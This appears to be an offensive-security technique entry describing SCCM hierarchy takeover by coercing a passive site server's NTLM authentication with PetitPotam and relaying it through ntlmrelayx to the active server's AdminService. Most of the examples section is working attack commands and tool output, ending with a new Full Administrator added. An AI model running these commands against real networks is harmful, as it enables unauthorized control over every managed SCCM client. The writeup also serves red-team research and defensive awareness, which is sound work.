# Hierarchy Takeover via NTLM Coercion and AdminService Relay From Passive Site Server

## Code Name
TAKEOVER04

## ATT&CK TTPs
- [T1078.002 - Valid Accounts](https://attack.mitre.org/techniques/T1078/002/)
- [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)

## Required Privilege / Context

Valid domain credentials with network connectivity to the passive primary site server and active primary site server.

## Summary

For high availability configurations the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover. As such, the passive site server also hosts the SMS Provider role. 

The SMS Provider is a Windows Management Instrumentation (WMI) provider that performs as an intermediary for accessing and modifying data stored in the site database. Access to the SMS Provider is controlled via membership of the the `SMS Admins` local security group on each site server. The active and passive site server computer accounts are a member of the `SMS Admins` security group on each SMS Provider in a site by default.

The SMS Provider also provides access to the site database via the administration service (adminservice) REST API and uses Microsoft Negotiate for authentication. In default configurations, the adminservice is vulnerable to NTLM relay attacks. 


## Impact

This technique may allow an attacker to relay a passive site server machine account to the AdminService hosted on the active site server and elevate their privileges to "Full Administrator" for the SCCM Hierarchy. If successful, this technique enables lateral movement to all SCCM clients and/or sensitive systems.

## Examples

### SCCMHunter

```
[04:24:43 PM] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                    
[04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |                                                                                                                                          
                       +======================+===================+=================+==============+===============+==========+===========+=========+                                                                                                                                          
                       | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+  
```

### PetitPotam

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 passive.internal.lab

Trying pipe lsarpc
[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```
### NTLMRelayx

```
└─# python3 ntlmrelayx.py --adminservice --logonname "lab\specter" --displayname "lab\specter" --objectsid "S-1-5-21-2391214593-4168590120-2599633397-1133" -smb2support -t https://sccm.internal.lab/AdminService/wmi/SMS_Admin
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.141, attacking target https://sccm.internal.lab
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://sccm.internal.lab as LAB/PASSIVE$
[*] Adding administrator via SCCM AdminService...
[*] Server returned code 201, attack successful

```


## Defensive IDs


## References
- Garrett Foster, Site Takeover via SCCM’s AdminService API, https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf
- Microsoft, Plan for the SMS Provider, https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider
- Microsoft, What is the administration service in Configuration Manager?, https://learn.microsoft.com/en-us/mem/configmgr/develop/adminservice/overview